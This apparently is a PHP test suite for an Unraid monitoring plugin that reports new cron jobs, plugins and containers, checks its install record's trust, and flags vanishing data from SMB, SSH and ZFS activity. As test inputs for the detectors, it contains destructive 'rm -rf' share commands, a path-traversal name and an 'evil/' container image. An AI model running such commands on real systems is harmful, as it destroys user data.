         watchmanCronSignalEntry(['kind' => 'cron_new', 'p' => ['lines' => 1, 'jobs' => ['cron.update: root']]]),
         watchmanCronSignalEntry(['kind' => 'cron_new', 'p' => ['lines' => 2, 'jobs' => ['cron.d/cron.update: root', 'cron.d/x: * * * * * y']]])]);

    $tmp = sys_get_temp_dir() . '/office-tests-office-own-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash', 'advisor'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $record = "$src/advisor/installs.json";
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents", 'office_installs' => $record];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['go'], "#!/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    file_put_contents("$src/cron.d/root", "*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n");
    file_put_contents("$src/crontabs/root", "# nothing of root's own\n");
    file_put_contents("$src/logplugins/unraid-secretary-office.plg", "<PLUGIN name=\"unraid-secretary-office\" version=\"1\">\n");
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $now = time();              // real time: a cron.d file's change time can't be set
    $kopia = ['image' => 'ghcr.io/imagegenius/kopia', 'tokens' => ['--cap-add=SYS_ADMIN', '--device=/dev/fuse', '-p 51515:51515/tcp']];
    $node = ['image' => 'quay.io/prometheus/node-exporter:latest-distroless', 'tokens' => ['--network=host', '--pid=host', '-v /']];
    $containers = [];
    $docker = function () use (&$containers) { return $containers; };
    $acks = "$tmp/acks.json";
    watchmanRound($paths, $data, 1000, $now - 600, $docker, true, $acks);

    // the reload signal in both places, a stray file: nothing
    file_put_contents("$src/cron.d/cron.update", "root\n");
    file_put_contents("$src/crontabs/cron.update", "root\n");
    file_put_contents("$src/cron.d/notes", "remember to water the plants\nthis is no crontab at all\n");
    $r = watchmanRound($paths, $data, 1000, $now - 300, $docker, true, $acks);
    same('cron signal: cron.update (both folders) and a stray file are no new lines', [[], []], [$r['added'], $r['told']]);

    // his record (root only), then what came: two plugins of his, the cron.d file of one, a container from his form
    chmod("$src/advisor", 0700);
    $GLOBALS['advisorRecordFile'] = $record;
    advisorRecord(['kind' => 'plugin', 'id' => 'streamviewer', 'name' => 'streamviewer', 'url' => ADVISOR_EXTERNALS['streamviewer']['plg']], $now - 3000);
    advisorRecord(['kind' => 'plugin', 'id' => 'fcp', 'name' => 'fix.common.problems', 'url' => ADVISOR_EXTERNALS['fcp']['plg']], $now);
    advisorRecord(['kind' => 'plugin', 'id' => 'filesviewer', 'name' => 'filesviewer', 'url' => ADVISOR_EXTERNALS['filesviewer']['plg']], $now);
    advisorRecord(['kind' => 'container', 'id' => 'kopia', 'name' => 'kopia', 'image' => 'ghcr.io/imagegenius/kopia'], $now);
    advisorRecord(['kind' => 'container', 'id' => 'nodeexporter', 'name' => 'Node-Exporter', 'image' => $node['image']], $now);
    unset($GLOBALS['advisorRecordFile']);
    same('advisor record: root only, as the night watchman trusts it', [0700, 0600, 5],
        [fileperms("$src/advisor") & 0777, fileperms($record) & 0777, count(watchmanOfficeInstalls($record, $now))]);
    foreach (['fix.common.problems' => $now + 20, 'filesviewer' => $now + 60, 'streamviewer' => $now, 'other.plugin' => $now + 30] as $p => $t) {
        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"2026.10.06\" pluginURL=\"https://raw.githubusercontent.com/someone/$p/main/$p.plg\">\n");
        touch("$src/logplugins/$p.plg", $t);
    }
    file_put_contents("$src/cron.d/filesviewer", "# Files Viewer: empty expired recycle bin events daily\n30 4 * * * /usr/bin/php /usr/local/emhttp/plugins/filesviewer/include/filesviewer_recycle_cron.php > /dev/null 2>&1\n");
    file_put_contents("$src/cron.d/other.plugin", "15 3 * * * /usr/local/emhttp/plugins/other.plugin/run.sh\n");
    $containers = ['kopia' => $kopia + ['by' => 'consultant', 'created' => $now + 45],
                   'Node-Exporter' => ['image' => 'evil/node-exporter'] + $node + ['by' => 'consultant', 'created' => $now + 30],
                   'stranger' => $kopia + ['created' => $now + 50]];
    $r = watchmanRound($paths, $data, 1000, $now + 300, $docker, true, $acks);
    $book = watchmanLoad($data)['book'];
    $ours = array_values(array_filter($book, fn ($e) => ($e['by'] ?? null) === 'office'));
    $keys = array_column($ours, 'key');
    sort($keys);
    same('office own: his plugins, the cron.d file that came with one, the container from his form — noted by itself',
        [['container_new:kopia', 'cron_new:office:filesviewer', 'plugin_new:filesviewer', 'plugin_new:fix.common.problems'], [false], ['consultant']],
        [$keys, array_values(array_unique(array_map('watchmanOpen', $ours))), array_values(array_unique(array_column(array_column($ours, 'p'), 'installed_by')))]);
    $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
    ksort($open);
    same('office own: anything else stays reported — a plugin not his, one of his but long after his job, another name or image',
        ['container_new:Node-Exporter', 'container_new:stranger', 'cron_new', 'plugin_new:other.plugin', 'plugin_new:streamviewer'], array_keys($open));
    same('office own: the other cron.d file is told, his is not', ['cron.d/other.plugin: 15 3 * * * other.plugin/run.sh'], $open['cron_new']['p']['jobs'] ?? null);
    $told = array_column($r['told'], 'n', 'kind');
    ksort($told);
    same('office own: told only what isn\'t the office\'s', ['container_new' => 2, 'cron_new' => 1, 'plugin_new' => 2], $told);
    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
    same('office own: the next round — known, nothing new, no second note', [[], 4],
        [$r['added'], count(array_filter(watchmanLoad($data)['book'], fn ($e) => ($e['by'] ?? null) === 'office'))]);
    $page = watchmanPageState($data, $now + 700, false);
    $row = array_values(array_filter($page['book'], fn ($e) => ($e['key'] ?? '') === 'plugin_new:filesviewer' || ($e['t']['name'] ?? '') === 'filesviewer'))[0] ?? [];
    same('office own: on the page — noted by the office', ['office', false], [$row['by'] ?? null, $row['open'] ?? null]);

    // his record trusted only as root's own, nobody else may write it
    chmod($record, 0640);
    same('office record: a file others may read or write is not trusted', [], watchmanOfficeInstalls($record, $now));
    chmod($record, 0600);
    chmod("$src/advisor", 0755);
    same('office record: a folder others may enter is not trusted', [], watchmanOfficeInstalls($record, $now));
    chmod("$src/advisor", 0700);
    rename($record, "$tmp/elsewhere.json");
    symlink("$tmp/elsewhere.json", $record);
    same('office record: a link is not trusted', [], watchmanOfficeInstalls($record, $now));
    unlink($record);
    file_put_contents($record, json_encode(['installs' => [['t' => $now, 'kind' => 'plugin', 'name' => 'a/../b'], ['t' => (string) $now, 'kind' => 'plugin', 'name' => 'x'],
        ['t' => $now, 'kind' => 'container', 'name' => 'y'], ['t' => $now + 3600, 'kind' => 'plugin', 'name' => 'z'], ['t' => $now, 'kind' => 'other', 'name' => 'w']]]));
    chmod($record, 0600);
    same('office record: only in exactly his shape', [], watchmanOfficeInstalls($record, $now));

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night watchman and data that vanishes: per ZFS share from `referenced` (its snapshots keeping
 * some, a pool asleep named), per XFS/btrfs disk from its used space (not while its snapshots changed),
 * who moved data then — and what is no loss: what moves data (the mover …), the office at work, a
 * dataset put into Ms. Dustdevil's storeroom or the storeroom emptied
 */
function testWatchmanFlowGone(): void
{
    $gb = 1024 ** 3;
    $tmp = sys_get_temp_dir() . '/office-tests-gone-flow-' . getmypid();
    same('gone movers: who moves data (not unbalanced\'s web page, always running)', ['mover', 'mover', 'embycache', 'gather', 'rsync', null, 'storeroom', null, null], array_map('watchmanFlowMover', [
        ['/bin/bash', '/usr/local/sbin/mover', 'start'], ['/bin/bash', '/usr/local/emhttp/plugins/ca.mover.tuning/age_mover', 'start'],
        ['python3', '/usr/local/emhttp/plugins/unraid-secretary-office/embycache/embycache_run.py', '--run'],
        ['bash', '/usr/local/emhttp/plugins/unraid-secretary-office/gather/consolidate_master.sh', 'run'],
        ['rsync', '-a', '--remove-source-files', '/mnt/user/a/', '/mnt/user/b/'], ['rsync', '-a', '/mnt/user/a/', '/mnt/user/b/'],
        ['rm', '-rf', '--', '/mnt/hive/Serien/_UnraidSecretaryOffice-trash/20261006-1010.purging'], ['rm', '-rf', '/mnt/hive/Serien/Staffel 1'],
        ['/usr/local/emhttp/plugins/unbalanced/unbalanced', '--port', '7090']]));
    foreach (['100' => ['/bin/bash', '/usr/local/sbin/mover', 'start'], '200' => ['sleep', '60'], 'self' => ['x']] as $pid => $argv) {
        @mkdir("$tmp/proc/$pid", 0700, true);
        file_put_contents("$tmp/proc/$pid/cmdline", implode("\0", $argv) . "\0");
    }
    same('gone movers: from /proc', [['mover'], null], [watchmanFlowMovers("$tmp/proc"), watchmanFlowMovers("$tmp/none")]);

    // the disks: an awake btrfs disk with snapshots and shares, an XFS one asleep, ZFS left to the datasets
    foreach (['disk1/.btrfs-snap/20261006-0100', 'disk1/Serien', 'disk1/Filme', 'disk1/_UnraidSecretaryOffice-trash', 'disk1/.Recycle.Bin', 'disk2/Filme'] as $d) {
        @mkdir("$tmp/mnt/$d", 0700, true);
    }
    touch("$tmp/mnt/disk1/.btrfs-snap", 1791200000);
    file_put_contents("$tmp/disks.ini", "[parity]\nname=\"parity\"\ntype=\"Parity\"\nfsType=\"\"\n[disk1]\nname=\"disk1\"\ntype=\"Data\"\nfsType=\"luks:btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n"
        . "[disk2]\nname=\"disk2\"\ntype=\"Data\"\nfsType=\"xfs\"\nfsStatus=\"Mounted\"\nspundown=\"1\"\n[hive]\nname=\"hive\"\ntype=\"Cache\"\nfsType=\"zfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n");
    $d = watchmanFlowDisks(['disks_ini' => "$tmp/disks.ini", 'mnt' => "$tmp/mnt"]);
    same('gone disks: the awake XFS/btrfs ones with their shares and snapshot time, the sleeping one not asked', [['disk1'], 'btrfs', 1791200000, ['Filme', 'Serien'], true, ['disk2']],
        [array_keys($d['disks'] ?? []), $d['disks']['disk1']['fs'] ?? null, $d['disks']['disk1']['snap'] ?? null,
         (function (array $a) { sort($a); return $a; })($d['disks']['disk1']['shares'] ?? []), ($d['disks']['disk1']['used'] ?? 0) > 0, $d['asleep'] ?? null]);
    exec('rm -rf ' . escapeshellarg($tmp));

    same('gone: the share of a dataset — also a share put whole into the storeroom (a second run in that second: -2)', ['Serien', 'Serien', 'Serien', null, 'Serien', 'old'],
        [watchmanGoneShare('tank/Serien'), watchmanGoneShare('tank/Serien/Staffel 1'), watchmanGoneShare('tank/Serien/_UnraidSecretaryOffice-trash-20261006-140500-x'),
         watchmanGoneShare('tank'), watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-Serien/sub'),
         watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-2-old')]);

    // rounds on made-up looks
    $t0 = strtotime('2026-10-06 14:02:00');
    $ds = fn (int $r, int $b = 0) => ['w' => 0, 'u' => $r + $b, 's' => 1000, 'r' => $r, 'b' => $b];
    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
    $conn = fn (string $peer, int $sent, string $svc = 'ssh', int $lport = 22) => ['local' => '192.0.2.20', 'lport' => $lport, 'peer' => $peer, 'pport' => 50000,
        'service' => $svc, 'sent' => $sent, 'rcvd' => 0];
    $zfs = fn (array $sets, array $asleep = []) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => $asleep];
    $disks = fn (int $used1, int $used3, int $snap3) => ['disks' => ['disk1' => ['fs' => 'btrfs', 'used' => $used1, 'snap' => 1791200000, 'shares' => ['Filme', 'Serien']],
        'disk3' => ['fs' => 'btrfs', 'used' => $used3, 'snap' => $snap3, 'shares' => ['Musik']]], 'asleep' => []];
    $bf = null;
    $book = [];
    $all = ['tank/Serien' => $ds(1000 * $gb), 'tank/Serien/sub' => $ds(100 * $gb), 'cold/Serien' => $ds(50 * $gb), 'tank/Filme' => $ds(440 * $gb),
            'tank/Filme/old' => $ds(20 * $gb), 'tank/Filme/tmp' => $ds(60 * $gb), 'tank/_UnraidSecretaryOffice-trash-20261005-090000-junk' => $ds(30 * $gb)];
    [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn('192.0.2.7', 1000)], 'zfs' => $zfs($all) + ['pools' => ['tank', 'cold']],
        'disks' => $disks(10000 * $gb, 5000 * $gb, 1791200000)]), $book, $t0);
    same('gone: the first look — counters only', [[], []], [$flow['gone'], $book]);

    // five minutes later: 300 GB gone from Serien (200 GB kept by its snapshots, cold asleep), Filme: one dataset into the storeroom,
    // one destroyed (60 GB of ~520), the storeroom emptied; disk1 200 GB less, disk3's snapshots changed
    $now = $all;
    $now['tank/Serien'] = $ds(700 * $gb, 200 * $gb);
    unset($now['cold/Serien'], $now['tank/Filme/old'], $now['tank/Filme/tmp'], $now['tank/_UnraidSecretaryOffice-trash-20261005-090000-junk']);
    $now['tank/Filme/_UnraidSecretaryOffice-trash-20261006-140500-old'] = $ds(20 * $gb);
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now, ['cold']),
        'disks' => $disks(9800 * $gb, 4000 * $gb, $t0 + 200)]), $book, $t0 + 300);
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
    $se = $by['flow_gone:share:Serien']['p'] ?? [];
    same('gone: Serien (300 GB, 27 %, 200 GB still in snapshots, cold asleep, an SSH client then), Filme (the destroyed one only), disk1 — disk3 left out',
        [['flow_gone', 'flow_gone', 'flow_gone'], ['flow_gone:disk:disk1', 'flow_gone:share:Filme', 'flow_gone:share:Serien'], [300 * $gb, 27, 200 * $gb, ['cold'], 'clients', ['192.0.2.7 (SSH)']],
         60 * $gb, 200 * $gb, [0, 0]],
        [$added, (function (array $a) { sort($a); return $a; })(array_keys($by)), [$se['bytes'] ?? null, $se['pct'] ?? null, $se['kept'] ?? null, $se['asleep'] ?? null, $se['from'] ?? null, $se['clients'] ?? null],
         $by['flow_gone:share:Filme']['p']['bytes'] ?? null, $by['flow_gone:disk:disk1']['p']['bytes'] ?? null,
         [array_sum($flow['gone']['disk:disk3']['h'] ?? []), array_sum($flow['gone']['disk:disk3']['o'] ?? [])]]);
    same('gone in words', "300 GB gone from Serien in 5 min — 27 % of the share while I'm still learning what is normal. 200 GB of it still in its snapshots. "
        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Not looked at (asleep): cold.",
        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:share:Serien'], 'en'), 'en'));
    same('gone in words: a disk', "200 GB gone from disk1 (Filme, Serien) in 5 min — more than 100 GB in one round while I'm still learning what is normal. "
        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Measured for the whole disk (btrfs), not per share.",
        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:disk:disk1'], 'en'), 'en'));

    // the mover runs: what vanishes meanwhile (and the round after) went elsewhere; then nobody connected: from the server itself
    $now['tank/Musik'] = $ds(800 * $gb);
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'moving' => ['mover']]), $book, $t0 + 600);
    $now['tank/Musik'] = $ds(600 * $gb);
    [$added2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 900);
    $now['tank/Musik'] = $ds(400 * $gb);
    [$added3, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'holder' => 'backup']), $book, $t0 + 1200);
    $now['tank/Musik'] = $ds(200 * $gb);
    [$added4, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 1500);
    $mu = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_gone:share:Musik']['p'] ?? [];
    same('gone: the mover moving (and the round after), the office at work — expected; then 200 GB with nobody connected: the server itself',
        [[], [], [], ['flow_gone'], 400 * $gb, 'server', []],
        [$added, $added2, $added3, $added4, array_sum($flow['gone']['share:Musik']['o'] ?? []), $mu['from'] ?? null, $flow['can']['moving'] ?? null]);

    // a whole share (with a child dataset) put into the storeroom, later the storeroom emptied: never a loss
    $now['tank/Alt'] = $ds(90 * $gb);
    $now['tank/Alt/kind'] = $ds(10 * $gb);
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1510);
    unset($now['tank/Alt'], $now['tank/Alt/kind']);
    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'] = $ds(90 * $gb);
    $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind'] = $ds(10 * $gb);
    [$a1, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1520);
    unset($now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt'], $now['tank/_UnraidSecretaryOffice-trash-20261006-143000-Alt/kind']);
    [$a2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($now)]), $book, $t0 + 1530);
    same('gone: a share put whole into the storeroom, the storeroom emptied — no loss', [[], [], 0],
        [$a1, $a2, array_sum($flow['gone']['share:Alt']['h'] ?? []) + array_sum($flow['gone']['share:Alt']['o'] ?? [])]);

    $f = watchmanFlowSummary($bf, $flow, $t0 + 1600);
    $rows = array_column($f['gone'], null, 'key');
    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 400 * $gb, 200 * $gb, 'disk1', 100, 10],
        [$rows['share:Serien']['day'] ?? null, $rows['share:Musik']['expected'] ?? null, $rows['share:Musik']['day'] ?? null, $rows['disk:disk1']['disk'] ?? null,
         (int) round($f['limits']['gone_new'] / $gb), $f['limits']['gone_part']]);
    $b2 = ['flow' => $bf];
    watchmanFlowAdopt($b2, array_column($book, null, 'key')['flow_gone:share:Serien'], $t0 + 1700);
    same('gone ack: that much is normal for the share now', 300 * $gb, $b2['flow']['ack']['flow_gone:share:Serien']['bytes'] ?? null);
}

/**
 * The night watchman's data flow: the parsers on real output (ss -tin, smbstatus -b, zfs get,
 * /proc/<pid>/net/dev — addresses anonymised), then rounds on made-up looks: the first look counts
 * nothing, deltas per connection, container and dataset, what is unusual while learning and once
 * learned, the office's own backup and media servers expected, snapshots taken and deleted, a pool
 * asleep, SMB's users, machines and hours, «I know, thanks» raising the normal, the page and metrics.
 */
function testWatchmanFlow(): void
{
    $gb = 1024 ** 3;
    $ports = watchmanFlowPorts(['PORT' => '80', 'PORTSSL' => '443', 'PORTSSH' => '22']);
    same('flow ports: SMB, NFS, SSH, the WebGUI', [22 => 'ssh', 80 => 'web', 139 => 'smb', 443 => 'web', 445 => 'smb', 2049 => 'nfs'], $ports);
    same('flow ports: as var.ini has them', [139 => 'smb', 445 => 'smb', 2049 => 'nfs', 2222 => 'ssh', 8080 => 'web', 8443 => 'web'],
        watchmanFlowPorts(['PORT' => '8080', 'PORTSSL' => '8443', 'PORTSSH' => '2222']));

    // ss -tinH state established '( sport = :445 or … )', as iproute2 7.1 prints it
    $ss = "0      0      192.0.2.20:445 192.0.2.7:55802\n"
        . "\t bbr wscale:6,9 rto:246 rtt:45.275/8.359 ato:118 mss:1368 pmtu:1500 rcvmss:1076 advmss:1448 cwnd:10 ssthresh:33 bytes_sent:32840019 bytes_retrans:661846 bytes_acked:32178173 bytes_received:24455317 segs_out:69826 segs_in:130590 data_segs_out:67789 data_segs_in:65970 send 2417228bps lastsnd:507 lastrcv:507 lastack:464 pacing_rate 903296bps delivery_rate 730048bps delivered:66893 app_limited busy:3078775ms retrans:0/1055 rcv_space:179080 minrtt:26.563 snd_wnd:216832 rcv_wnd:931328 rehash:84 \n"
        . "0      292    192.0.2.20:22  192.0.2.7:58436\n"
        . "\t bbr wscale:6,9 rto:239 rtt:38.161/13.082 ato:40 mss:1368 cwnd:18 bytes_sent:6210 bytes_acked:5918 bytes_received:4974 segs_out:20 segs_in:21 \n"
        . "0      0      192.0.2.20:80  192.0.2.7:58252\n"
        . "\t cubic wscale:7,7 rto:204 rtt:3.2/1.1 mss:1448 cwnd:10 bytes_sent:40185701 bytes_retrans:2734473 bytes_acked:37451228 bytes_received:2212 \n"
        . "0      0      [::ffff:192.0.2.20]:445  [::ffff:192.0.2.8]:49152\n"
        . "\t cubic rto:204 bytes_sent:1000 bytes_received:300 \n"
        . "0      0      [2001:db8::20]:2049  [2001:db8::7%br0]:833\n"
        . "\t cubic rto:204 bytes_sent:77 bytes_acked:70 bytes_received:5 \n"
        . "0      0      192.0.2.20:9100  192.0.2.30:40000\n"
        . "\t cubic bytes_sent:999 bytes_acked:999 \n";
    $c = watchmanSsParse($ss, $ports);
    same('flow ss: the file services only, delivered bytes (acked, else sent), IPv4 inside IPv6, IPv6 without its zone',
        [['192.0.2.7', 'smb', 32178173, 24455317], ['192.0.2.7', 'ssh', 5918, 4974], ['192.0.2.7', 'web', 37451228, 2212], ['192.0.2.8', 'smb', 1000, 300],
         ['2001:db8::7', 'nfs', 70, 5]],
        array_map(fn ($x) => [$x['peer'], $x['service'], $x['sent'], $x['rcvd']], $c));
    same('flow ss: the server\'s side and the ports', ['192.0.2.20', 445, 55802], [$c[0]['local'], $c[0]['lport'], $c[0]['pport']]);
    same('flow ss: nothing', [], watchmanSsParse('', $ports));

    // smbstatus -b --json (Samba 4.22), and the plain table of an older one
    $json = '{"timestamp": "2026-10-06T12:32:21.495236+0200", "version": "4.22.10", "smb_conf": "/etc/samba/smb.conf", "sessions": {"2639366901": {"session_id": "2639366901", '
          . '"server_id": {"pid": "1661504", "task_id": "0", "vnn": "4294967295", "unique_id": "2174023641075356141"}, "uid": 1000, "gid": 100, "username": "benj", '
          . '"groupname": "users", "creation_time": "2026-10-06T08:32:00.685066+02:00", "expiration_time": "30828-09-14T04:48:05.477581+02:00", '
          . '"auth_time": "2026-10-06T08:32:00.730198+02:00", "remote_machine": "192.0.2.7", "hostname": "ipv4:192.0.2.7:55802", "session_dialect": "SMB3_11", '
          . '"client_guid": "f8f6c3f9-c5ef-d249-a58a-7324699ba732", "encryption": {"cipher": "-", "degree": "none"}, "signing": {"cipher": "AES-128-GMAC", "degree": "partial"}, '
          . '"channels": {"0": {"channel_id": "0", "creation_time": "2026-10-06T08:32:00.685066+02:00", "local_address": "ipv4:192.0.2.20:445", "remote_address": "ipv4:192.0.2.7:55802"}}}, '
          . '"77": {"session_id": "77", "username": "nobody", "remote_machine": "laptop", "hostname": "ipv6:[2001:db8::7]:50000", "creation_time": "2026-10-06T09:00:00+02:00"}}}';
    same('flow smbstatus --json: user, address, machine, when it started',
        [['2639366901', 'benj', '192.0.2.7', '192.0.2.7', strtotime('2026-10-06 08:32:00')], ['77', 'nobody', '2001:db8::7', 'laptop', strtotime('2026-10-06 09:00:00')]],
        array_map(fn ($s) => array_values($s), (array) watchmanSmbParse($json)));
    same('flow smbstatus --json: no sessions', [], watchmanSmbParse('{"timestamp": "x", "sessions": {}}'));
    $table = "\nSamba version 4.22.10\nPID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              \n"
           . str_repeat('-', 136) . "\n"
           . "1661504 benj         users        192.0.2.7 (ipv4:192.0.2.7:55802)      SMB3_11           -                    partial(AES-128-GMAC)\n"
           . "2000001 nobody       nogroup      laptop (ipv6:[2001:db8::7]:50000)      SMB3_11           -                    -                    \n\n";
    same('flow smbstatus -b: the table of an older Samba', [['pid1661504', 'benj', '192.0.2.7', '192.0.2.7', null], ['pid2000001', 'nobody', '2001:db8::7', 'laptop', null]],
        array_map(fn ($s) => array_values($s), (array) watchmanSmbParse($table)));
    same('flow smbstatus: neither is none', null, watchmanSmbParse("smbstatus: unknown option --json\n"));

    // zfs get -Hp -o name,property,value -t filesystem,volume -r written,used,snapshots_changed
    $zfs = "tank\twritten\t155648\ntank\tused\t5564653240320\ntank\tsnapshots_changed\t-\n"
         . "tank/appdata\twritten\t2744066048\ntank/appdata\tused\t1366701264896\ntank/appdata\tsnapshots_changed\t1791242200\n"
         . "tank/tmp\twritten\t75522048\ntank/tmp\tused\t75522048\ntank/tmp\tsnapshots_changed\t-\n"
         . "tank/My Files\twritten\t0\ntank/My Files\tused\t98304\ntank/My Files\tsnapshots_changed\t1791280804\n";
    same('flow zfs: written, used, the last snapshot change (none: never a snapshot)',
        ['tank' => ['w' => 155648, 'u' => 5564653240320, 's' => null], 'tank/appdata' => ['w' => 2744066048, 'u' => 1366701264896, 's' => 1791242200],
         'tank/tmp' => ['w' => 75522048, 'u' => 75522048, 's' => null], 'tank/My Files' => ['w' => 0, 'u' => 98304, 's' => 1791280804]], watchmanZfsParse($zfs));

    // /proc/<pid>/net/dev of a container (bridge or macvlan alike): what every interface but lo sent
    $dev = "Inter-|   Receive                                                |  Transmit\n"
         . " face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n"
         . "    lo: 4148728   32674    0    0    0     0          0         0  4148728   32674    0    0    0     0       0          0\n"
         . " tunl0:       0       0    0    0    0     0          0         0        0       0    0    0    0     0       0          0\n"
         . "  eth0: 150120315180 264328623    0    0    0     0          0    148454 1735183657381 306999993    0    0    0     0       0          0\n"
         . "  eth1: 5402383   40340    0    0    0     0          0     33756  2026277    6175    0    0    0     0       0          0\n";
    same('flow net/dev: sent bytes without lo', 1735183657381 + 2026277, watchmanNetDevTx($dev));
    same('flow net/dev: nothing readable', null, watchmanNetDevTx(''));
    same('flow size: like the page', ['1023 B', '1.0 GB', '5,0 GB', '38 GB'], [watchmanSize(1023), watchmanSize($gb), watchmanSize(5 * $gb, 'de'), watchmanSize(38 * $gb)]);

    // rounds on made-up looks: Monday 10:02 is the first
    $t0 = strtotime('2026-10-05 10:02:00');
    $conn = fn (string $peer, int $sent, int $pport = 50000, string $svc = 'smb', int $lport = 445) =>
        ['local' => '192.0.2.20', 'lport' => $lport, 'peer' => $peer, 'pport' => $pport, 'service' => $svc, 'sent' => $sent, 'rcvd' => 0];
    $ct = fn (int $pid, string $ns, int $tx, string $image = 'img', bool $host = false) => ['pid' => $pid, 'ns' => $ns, 'tx' => $tx, 'host' => $host, 'image' => $image];
    $ds = fn (int $w, int $u, ?int $s) => ['w' => $w, 'u' => $u, 's' => $s];
    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice']];      // null: not looked at this time
    $sess = fn (string $id, string $user, string $ip, int $start, string $machine = '') => ['id' => $id, 'user' => $user, 'ip' => $ip, 'machine' => $machine, 'start' => $start];
    $cts = fn (int $kopia, int $emby, int $web, int $app) => ['kopia' => $ct(100, 'n1', $kopia, 'ghcr.io/imagegenius/kopia'), 'EmbyServer' => $ct(200, 'n2', $emby, 'emby/embyserver'),
        'web' => $ct(300, 'n3', $web, 'nginx'), 'app' => $ct(400, 'n4', $app), 'app-db' => $ct(401, 'n4', $app), 'node' => $ct(500, 'host', 99 * $gb, 'node-exporter', true)];
    $zfs = fn (int $data, int $media, ?int $snapData = 1000, ?int $snapMedia = 1000, int $place = 0) => ['datasets' => [
        'tank' => $ds(1, 900 * $gb, null), 'tank/data' => $ds($data, 100 * $gb, $snapData), 'tank/data/sub' => $ds(0, $gb, $snapData),
        'tank/media' => $ds($media, 500 * $gb, $snapMedia), 'tank/tmp' => $ds(10 * $gb, 10 * $gb, null),
        'tank/UnraidSecretaryOffice' => $ds($place, 50 * $gb, 1000)], 'pools' => ['tank'], 'asleep' => ['cold']];
    $bf = null;
    $book = [];
    $kinds = fn (array $added) => (function (array $a) { sort($a); return $a; })($added);

    [$added, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn('192.0.2.7', 5 * $gb)], 'containers' => $cts(500 * $gb, 10 * $gb, 0, $gb),
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t0 - 3600)]], 'zfs' => $zfs($gb, 0)]), $book, $t0);
